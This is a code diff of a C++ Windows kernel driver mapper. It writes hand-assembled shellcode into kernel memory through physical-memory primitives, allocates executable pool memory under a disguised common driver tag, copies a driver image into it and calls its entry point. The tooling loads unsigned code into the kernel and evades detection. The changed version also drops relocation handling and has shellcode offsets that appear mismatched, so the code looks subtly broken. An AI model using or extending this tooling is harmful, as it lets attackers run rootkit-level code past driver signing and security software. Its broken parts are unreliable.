@@ -420,22 +420,18 @@ private:
         return 0;
     }
 
-    // Allocate kernel memory using dynamic allocation strategy
+    // Allocate kernel memory using direct pool allocation
     uint64_t AllocateKernelMemory(size_t size) {
-        // Try to find usable memory region
-        uint64_t addr = FindUsableKernelMemory(size);
-        if (!addr) {
-            std::cerr << "[-] Failed to find usable kernel memory region" << std::endl;
-            return 0;
-        }
-
-        std::cout << "[*] Found usable memory region at 0x" << std::hex << addr << std::dec << std::endl;
+        std::cout << "[*] Attempting direct pool allocation of " << size << " bytes" << std::endl;
         
-        // Try to allocate using ExAllocatePool2 first
+        // Align size to page boundary
+        size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+        
+        // Prepare shellcode for ExAllocatePool2
         uint8_t shellcode[] = {
             0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
             0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 
-            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPoolNx (4)
+            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPool (0)
             0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,             // mov rdx, size
             0x49, 0xB8, 0x00, 0x00, 0x00, 0x00,
@@ -443,42 +439,41 @@ private:
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,             // mov rax, ExAllocatePool2
             0xFF, 0xD0,                         // call rax
-            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov [resultAddr], rax
+            0x48, 0x89, 0x05, 0x00, 0x00, 0x00, 
+            0x00,                               // mov [rip], rax
             0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
             0xC3                                // ret
         };
 
-        // Find space for result
-        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
-        if (!resultAddr) {
-            std::cerr << "[-] Failed to find memory for result" << std::endl;
-            return 0;
-        }
-        
         // Set up parameters for ExAllocatePool2
-            // Use random pool tag from our set
-            ULONG poolTag = POOL_TAGS[rand() % POOL_TAGS_COUNT];
-            *(uint64_t*)(shellcode + 6) = 4;  // NonPagedPoolNx
-            *(uint64_t*)(shellcode + 16) = size;
-            *(uint64_t*)(shellcode + 26) = poolTag;  // Random pool tag
+        *(uint64_t*)(shellcode + 6) = 0;  // NonPagedPool (potentially executable)
+        *(uint64_t*)(shellcode + 16) = size;
+        *(uint64_t*)(shellcode + 26) = 'rdMm';  // Common driver tag
         *(uint64_t*)(shellcode + 36) = exAllocatePoolAddress;
-        *(uint64_t*)(shellcode + 48) = resultAddr;
-        
-        // Find space for shellcode
-        uint64_t shellcodeAddr = FindUsableKernelMemory(sizeof(shellcode));
+
+        // Find a small region for our allocation shellcode
+        uint64_t shellcodeAddr = 0;
+        for (uint64_t offset = 0; offset < 0x1000000; offset += PAGE_SIZE) {
+            uint64_t testAddr = ntoskrnlBase + offset;
+            std::vector<uint8_t> testBuffer(16, 0);
+            if (WritePhysicalMemory(testAddr, testBuffer.data(), testBuffer.size())) {
+                shellcodeAddr = testAddr;
+                break;
+            }
+        }
+
         if (!shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
             return 0;
         }
-        
+
         std::cout << "[*] Writing allocation shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(shellcodeAddr, shellcode, sizeof(shellcode))) {
             std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
             return 0;
         }
-        
-        // Execute shellcode and get result
+
+        // Execute shellcode
         uint64_t allocatedAddress = 0;
         if (!ExecuteKernelShellcode(shellcode, sizeof(shellcode), &allocatedAddress)) {
             std::cerr << "[-] Failed to execute allocation shellcode" << std::endl;
@@ -486,35 +481,47 @@ private:
         }
 
         if (!allocatedAddress) {
-            std::cerr << "[-] ExAllocatePool2 returned NULL" << std::endl;
+            std::cerr << "[-] Pool allocation returned NULL" << std::endl;
             return 0;
         }
+
+        std::cout << "[+] Successfully allocated " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
         
-        // Zero the allocated memory
-        std::vector<uint8_t> zeroBuffer(size, 0);
-        std::cout << "[*] Zeroing allocated memory at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
-        if (!WritePhysicalMemory(allocatedAddress, zeroBuffer.data(), size)) {
-            std::cerr << "[-] Failed to zero allocated memory" << std::endl;
+        // Verify the allocation is writable
+        std::vector<uint8_t> testPattern(16, 0xAA);
+        if (!WritePhysicalMemory(allocatedAddress, testPattern.data(), testPattern.size())) {
+            std::cerr << "[-] Allocated memory is not writable" << std::endl;
             return 0;
         }
-        
-        std::cout << "[+] Successfully allocated and zeroed " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
+
+        // Read back and verify
+        std::vector<uint8_t> verifyBuffer(16);
+        if (!ReadPhysicalMemory(allocatedAddress, verifyBuffer.data(), verifyBuffer.size()) ||
+            memcmp(testPattern.data(), verifyBuffer.data(), testPattern.size()) != 0) {
+            std::cerr << "[-] Memory verification failed" << std::endl;
+            return 0;
+        }
+
+        std::cout << "[+] Memory allocation verified writable" << std::endl;
         return allocatedAddress;
     }
     
-    // Map a driver into kernel memory
+    // Map a driver into kernel memory using direct allocation
     bool MapDriver(const std::string& driverPath, uint64_t& baseAddress) {
+        std::cout << "[*] Loading driver file: " << driverPath << std::endl;
+        
+        // Read the driver file
         std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
         if (!file) {
-            std::cerr << "[-] Failed to open driver file: " << driverPath << std::endl;
+            std::cerr << "[-] Failed to open driver file" << std::endl;
             return false;
         }
         
-        std::streamsize size = file.tellg();
+        std::streamsize fileSize = file.tellg();
         file.seekg(0, std::ios::beg);
         
-        std::vector<char> buffer(size);
-        if (!file.read(buffer.data(), size)) {
+        std::vector<char> buffer(fileSize);
+        if (!file.read(buffer.data(), fileSize)) {
             std::cerr << "[-] Failed to read driver file" << std::endl;
             return false;
         }
@@ -532,162 +539,84 @@ private:
             return false;
         }
         
-        // Allocate kernel memory for the driver
-        uint64_t imageSize = ntHeaders->OptionalHeader.SizeOfImage;
-        uint64_t mappedImage = AllocateKernelMemory(imageSize);
-        if (!mappedImage) {
-            std::cerr << "[-] Failed to allocate kernel memory" << std::endl;
+        // Calculate total size needed (including headers)
+        uint64_t totalSize = ntHeaders->OptionalHeader.SizeOfImage;
+        std::cout << "[*] Allocating " << totalSize << " bytes for driver image" << std::endl;
+        
+        // Allocate memory for the entire driver
+        uint64_t driverBase = AllocateKernelMemory(totalSize);
+        if (!driverBase) {
+            std::cerr << "[-] Failed to allocate memory for driver" << std::endl;
+            return false;
+        }
+        
+        // Copy PE headers
+        std::cout << "[*] Writing PE headers" << std::endl;
+        if (!WritePhysicalMemory(driverBase, buffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders)) {
+            std::cerr << "[-] Failed to write PE headers" << std::endl;
             return false;
         }
         
         // Copy sections
         auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
         for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-            uint64_t sectionAddress = mappedImage + sectionHeader[i].VirtualAddress;
-            uint64_t sectionSize = sectionHeader[i].SizeOfRawData;
-            uint64_t sectionData = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
-            
-            if (sectionSize > 0) {
-                std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionAddress << std::dec << std::endl;
-                if (!WritePhysicalMemory(sectionAddress, reinterpret_cast<void*>(sectionData), sectionSize)) {
-                    std::cerr << "[-] Failed to write section data" << std::endl;
+            if (sectionHeader[i].SizeOfRawData > 0) {
+                uint64_t sectionDest = driverBase + sectionHeader[i].VirtualAddress;
+                uint64_t sectionSrc = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
+                
+                std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionDest << std::dec << std::endl;
+                if (!WritePhysicalMemory(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
+                    std::cerr << "[-] Failed to write section " << i << std::endl;
                     return false;
                 }
             }
         }
         
-        // Process relocations
-        uint64_t relocationDelta = mappedImage - ntHeaders->OptionalHeader.ImageBase;
-        if (relocationDelta != 0 && ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
-            std::cout << "[+] Processing relocations for delta 0x" << std::hex << relocationDelta << std::dec << std::endl;
-            
-            auto relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-            uint64_t relocationTable = mappedImage + relocDir.VirtualAddress;
-            
-            IMAGE_BASE_RELOCATION relocBlock;
-            uint64_t relocOffset = 0;
-            
-            while (relocOffset < relocDir.Size) {
-                // Read relocation block
-                if (!ReadPhysicalMemory(relocationTable + relocOffset, &relocBlock, sizeof(relocBlock))) {
-                    std::cerr << "[-] Failed to read relocation block" << std::endl;
-                    return false;
-                }
-                
-                uint64_t numEntries = (relocBlock.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-                std::vector<WORD> entries(numEntries);
-                
-                // Read relocation entries
-                if (!ReadPhysicalMemory(
-                    relocationTable + relocOffset + sizeof(IMAGE_BASE_RELOCATION),
-                    entries.data(),
-                    numEntries * sizeof(WORD))) {
-                    std::cerr << "[-] Failed to read relocation entries" << std::endl;
-                    return false;
-                }
-                
-                // Process each entry
-                for (WORD entry : entries) {
-                    if ((entry >> 12) == IMAGE_REL_BASED_DIR64) {
-                        uint64_t offset = relocBlock.VirtualAddress + (entry & 0xFFF);
-                        uint64_t address = 0;
-                        
-                        // Read address to relocate
-                        if (!ReadPhysicalMemory(mappedImage + offset, &address, sizeof(address))) {
-                            std::cerr << "[-] Failed to read relocation address" << std::endl;
-                            return false;
-                        }
-                        
-                        // Apply relocation
-                        address += relocationDelta;
-                        
-                        // Write relocated address
-                        if (!WritePhysicalMemory(mappedImage + offset, &address, sizeof(address))) {
-                            std::cerr << "[-] Failed to write relocated address" << std::endl;
-                            return false;
-                        }
-                    }
-                }
-                
-                relocOffset += relocBlock.SizeOfBlock;
-            }
-        }
-        
-        // Execute driver entry point
-        uint64_t entryPoint = mappedImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-        
-        std::cout << "[+] Driver mapped at 0x" << std::hex << mappedImage << std::dec << std::endl;
-        std::cout << "[+] Entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
-        
-        // Create driver object
+        // Create minimal driver object
         DRIVER_OBJECT driverObject = { 0 };
+        driverObject.DriverStart = reinterpret_cast<PVOID>(driverBase);
+        driverObject.DriverSize = static_cast<ULONG>(totalSize);
+        
         uint64_t driverObjectAddr = AllocateKernelMemory(sizeof(DRIVER_OBJECT));
         if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
             std::cerr << "[-] Failed to create driver object" << std::endl;
             return false;
         }
         
-        // Create registry path
-        UNICODE_STRING registryPath = { 0 };
-        uint64_t registryPathAddr = AllocateKernelMemory(sizeof(UNICODE_STRING));
-        if (!registryPathAddr || !WritePhysicalMemory(registryPathAddr, &registryPath, sizeof(UNICODE_STRING))) {
-            std::cerr << "[-] Failed to create registry path" << std::endl;
-            return false;
-        }
+        // Prepare entry point call
+        uint64_t entryPoint = driverBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+        std::cout << "[*] Driver entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
         
-        // Create shellcode for driver entry
+        // Simple shellcode to call driver entry
         uint8_t entryShellcode[] = {
-            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
+            0x48, 0x83, 0xEC, 0x28,                    // sub rsp, 0x28
+            0x48, 0x31, 0xD2,                          // xor rdx, rdx
             0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rcx, driverObjectAddr
-            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rdx, registryPathAddr
+            0x00, 0x00, 0x00, 0x00,                    // mov rcx, driverObjectAddr
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rax, entryPoint
-            0xFF, 0xD0,                         // call rax
-            0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
-            0xC3                                // ret
+            0x00, 0x00, 0x00, 0x00,                    // mov rax, entryPoint
+            0xFF, 0xD0,                                // call rax
+            0x48, 0x83, 0xC4, 0x28,                    // add rsp, 0x28
+            0xC3                                        // ret
         };
-
-        // Set up parameters
-        *(uint64_t*)(entryShellcode + 6) = driverObjectAddr;
-        *(uint64_t*)(entryShellcode + 16) = registryPathAddr;
-        *(uint64_t*)(entryShellcode + 26) = entryPoint;
-
-        // Find space for result
-        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
-        if (!resultAddr) {
-            std::cerr << "[-] Failed to find memory for result" << std::endl;
-            return 0;
-        }
-
-        // Add result storage to shellcode
-        uint8_t resultShellcode[] = {
-            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00              // mov [resultAddr], rax
-        };
-        *(uint64_t*)(resultShellcode + 2) = resultAddr;
-
-        // Combine shellcodes
-        std::vector<uint8_t> fullShellcode;
-        fullShellcode.insert(fullShellcode.end(), entryShellcode, entryShellcode + sizeof(entryShellcode));
-        fullShellcode.insert(fullShellcode.end(), resultShellcode, resultShellcode + sizeof(resultShellcode));
-
-        // Execute entry point and get result
+        
+        *(uint64_t*)(entryShellcode + 9) = driverObjectAddr;
+        *(uint64_t*)(entryShellcode + 19) = entryPoint;
+        
+        // Execute entry point
         uint64_t entryResult = 0;
-        if (!ExecuteKernelShellcode(fullShellcode.data(), fullShellcode.size(), &entryResult)) {
+        if (!ExecuteKernelShellcode(entryShellcode, sizeof(entryShellcode), &entryResult)) {
             std::cerr << "[-] Failed to execute driver entry point" << std::endl;
             return false;
         }
-
+        
         if (entryResult != 0) {
             std::cerr << "[-] Driver entry point returned error 0x" << std::hex << entryResult << std::dec << std::endl;
             return false;
         }
-
-        std::cout << "[+] Driver entry point executed successfully" << std::endl;
         
-        baseAddress = mappedImage;
+        std::cout << "[+] Driver successfully mapped and initialized" << std::endl;
+        baseAddress = driverBase;
         return true;
     }
     
